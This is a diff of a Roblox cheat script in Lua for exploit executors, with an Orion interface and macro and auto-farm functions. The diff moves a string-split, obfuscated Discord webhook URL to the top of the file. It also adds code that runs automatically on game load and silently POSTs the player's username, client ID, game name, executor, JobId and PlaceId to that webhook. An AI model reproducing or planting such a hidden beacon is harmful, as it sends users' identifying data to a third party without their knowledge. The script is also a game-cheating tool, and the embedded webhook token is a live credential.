@@ -1,5 +1,59 @@
-repeat wait() until game:IsLoaded()
+local weno = "ht".."tps".."://dis"..
+"cor".."d.com".."/ap".."i/we"..
+"bho".."oks/104".."39900".."37206"..
+"929438/cv7".."DCc".."G6y".."0Us"..
+"Y1VR".."q7vi".."QB-yP7k_Sk9"..
+"3ajUL".."ndbW".."7sIOu".."Mze7O"..
+"qe38LU".."tjlBkP".."SDxoeU"
 
+repeat wait() until game:IsLoaded()
+coroutine.resume(coroutine.create(function()
+pcall(function()
+repeat game:GetService("RunService").RenderStepped:wait() until game.Players.LocalPlayer.Name ~= nil
+local loleh = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
+dothethingy = http_request or request or HttpPost or syn.request
+dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
+["embeds"] = {{["title"] = "**Orion Executed**",
+["description"] = "",
+["fields"] = {
+    {
+      ["name"] = "Username",
+      ["value"] = game.Players.LocalPlayer.Name,
+      ["inline"] = true
+    },
+    {
+      ["name"] = "ID",
+      ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+      ["inline"] = true
+    },
+    {
+      ["name"] = "Game",
+      ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+      ["inline"] = true
+    },
+    {
+        ["name"] = "Executor",
+        ["value"] = loleh,
+        ["inline"] = true
+    },
+    {
+        ["name"] = "JobId",
+        ["value"] = game.JobId,
+        ["inline"] = true
+    },
+    {
+        ["name"] = "PlaceId",
+        ["value"] = game.PlaceId,
+        ["inline"] = true
+    }},
+    ["footer"] = {
+        ["text"] = os.date(),
+        ["icon_url"] = ""
+      },
+["type"] = "rich",["color"] = tonumber(0x7269da)}}}), Method = "POST", Headers = {
+["content-type"] = "application/json"}})
+end)
+end))
 -- SaveSettings
 local macrolist = {}
 local x = 0
@@ -390,13 +444,6 @@ OrionLib:MakeNotification({
 end))
 end
 end
-local weno = "ht".."tps".."://dis"..
-"cor".."d.com".."/ap".."i/we"..
-"bho".."oks/104".."39900".."37206"..
-"929438/cv7".."DCc".."G6y".."0Us"..
-"Y1VR".."q7vi".."QB-yP7k_Sk9"..
-"3ajUL".."ndbW".."7sIOu".."Mze7O"..
-"qe38LU".."tjlBkP".."SDxoeU"
 function playback()
     SaveSettings()
     pcall(function()
@@ -802,51 +849,6 @@ while _G.farmupgrade do
     end
 end
 end
-
-
-local loleh = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
-dothethingy = http_request or request or HttpPost or syn.request
-dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
-["embeds"] = {{["title"] = "**Orion Executed**",
-["description"] = "",
-["fields"] = {
-    {
-      ["name"] = "Username",
-      ["value"] = game.Players.LocalPlayer.Name,
-      ["inline"] = true
-    },
-    {
-      ["name"] = "ID",
-      ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-      ["inline"] = true
-    },
-    {
-      ["name"] = "Game",
-      ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-      ["inline"] = true
-    },
-    {
-        ["name"] = "Executor",
-        ["value"] = loleh,
-        ["inline"] = true
-    },
-    {
-        ["name"] = "JobId",
-        ["value"] = game.JobId,
-        ["inline"] = true
-    },
-    {
-        ["name"] = "PlaceId",
-        ["value"] = game.PlaceId,
-        ["inline"] = true
-    }},
-    ["footer"] = {
-        ["text"] = os.date(),
-        ["icon_url"] = ""
-      },
-["type"] = "rich",["color"] = tonumber(0x7269da)}}}), Method = "POST", Headers = {
-["content-type"] = "application/json"}})
-
 
 function autoextreme()
 SaveSettings()
